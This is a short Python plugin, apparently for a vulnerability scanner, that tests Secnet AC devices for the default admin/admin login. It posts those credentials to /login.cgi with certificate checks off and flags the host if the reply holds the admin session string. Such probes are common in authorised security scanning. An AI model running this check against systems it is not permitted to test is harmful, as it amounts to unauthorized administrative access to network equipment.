#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'secnet ac默认口令',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/login.cgi'
  data = 'user=admin&password=admin'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False,allow_redirects=False)
    if res.status_code == 200 and re.search(r'ac_userid=admin,ac_passwd=',res.text,re.S):
      ret['huixian'] = data
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret